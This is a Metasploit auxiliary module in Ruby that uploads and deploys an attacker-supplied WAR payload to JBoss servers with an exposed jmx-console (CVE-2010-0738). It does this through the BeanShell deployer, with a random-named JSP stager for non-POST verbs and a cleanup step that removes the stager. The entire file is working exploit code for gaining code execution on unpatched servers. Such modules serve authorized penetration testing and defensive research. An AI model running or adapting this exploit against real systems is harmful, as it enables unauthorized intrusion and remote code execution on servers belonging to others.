##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::JBoss

  def initialize
    super(
      'Name'          => 'JBoss JMX Console Beanshell Deployer WAR Upload and Deployment',
      'Description'   => %q{
        This module can be used to install a WAR file payload on JBoss servers that have
        an exposed "jmx-console" application. The payload is put on the server by
        using the jboss.system:BSHDeployer's createScriptDeployment() method.
      },
      'Author'        =>
        [
          'us3r777 <us3r777[at]n0b0.so>'
        ],
      'References'    =>
        [
          [ 'CVE', '2010-0738' ], # using a VERB other than GET/POST
          [ 'OSVDB', '64171' ],
          [ 'URL', 'http://www.redteam-pentesting.de/publications/jboss' ],
          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=574105' ]
        ],
      'Actions'       =>
        [
          ['Deploy'],
          ['Undeploy']
        ],
      'DefaultAction' => 'Deploy',
      'License'       => BSD_LICENSE,
    )

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('APPBASE',    [ true,  'Application base name', 'payload']),
        OptPath.new('WARFILE',      [ false, 'The WAR file to deploy'])
      ])
  end

  def deploy_action(app_base, war_data)
    encoded_payload = Rex::Text.encode_base64(war_data).gsub(/\n/, '')

    if http_verb == 'POST'
      print_status("Deploying payload...")
      opts = {
        :file => "#{app_base}.war",
        :contents => encoded_payload
      }
    else
      print_status("Deploying stager...")
      stager_name = Rex::Text.rand_text_alpha(8 + rand(8))
      stager_contents = stager_jsp(app_base)
      opts = {
        :dir => "#{stager_name}.war",
        :file => "#{stager_name}.war/#{stager_name}.jsp",
        :contents => Rex::Text.encode_base64(stager_contents).gsub(/\n/, '')
      }
    end

    bsh_payload = generate_bsh(:create, opts)
    package = deploy_bsh(bsh_payload)

    if package.nil?
      print_error("Deployment failed")
      return
    else
      print_good("Deployment successful")
    end

    unless http_verb == 'POST'
      # call the stager to deploy our real payload war
      stager_uri = '/' + stager_name + '/' + stager_name + '.jsp'
      payload_data = "#{Rex::Text.rand_text_alpha(8+rand(8))}=#{Rex::Text.uri_encode(encoded_payload)}"
      print_status("Calling stager #{stager_uri} to deploy final payload...")
      res = deploy('method' => 'POST',
                   'data'   => payload_data,
                   'uri'    => stager_uri)
      if res && res.code == 200
        print_good("Payload deployed")
      else
        print_error("Failed to deploy final payload")
      end

      # Remove the stager
      print_status("Removing stager...")
      files = {}
      files[:stager_jsp_name] = "#{stager_name}.war/#{stager_name}.jsp"
      files[:stager_base] = "#{stager_name}.war"
      delete_script = generate_bsh(:delete, files)
      res = deploy_package(delete_script, package)
      if res.nil?
        print_error("Unable to remove Stager")
      else
        print_good("Stager successfully removed")
      end
    end

  end

  def undeploy_action(app_base)
    # Undeploy the WAR and the stager if needed
    print_status("Undeploying #{app_base} by deleting the WAR file via BSHDeployer...")

    files = {}
    files[:app_base] = "#{app_base}.war"
    delete_script = generate_bsh(:delete, files)

    package = deploy_bsh(delete_script)
    if package.nil?
      print_error("Unable to remove WAR")
    else
      print_good("Successfully removed")
    end
  end

  def run
    app_base = datastore['APPBASE']

    case action.name
    when 'Deploy'
      unless datastore['WARFILE'] && File.exist?(datastore['WARFILE'])
        print_error("WAR file not found")
        return
      end
      war_data = File.read(datastore['WARFILE'])
      deploy_action(app_base, war_data)
    when 'Undeploy'
      undeploy_action(app_base)
    end
  end
end
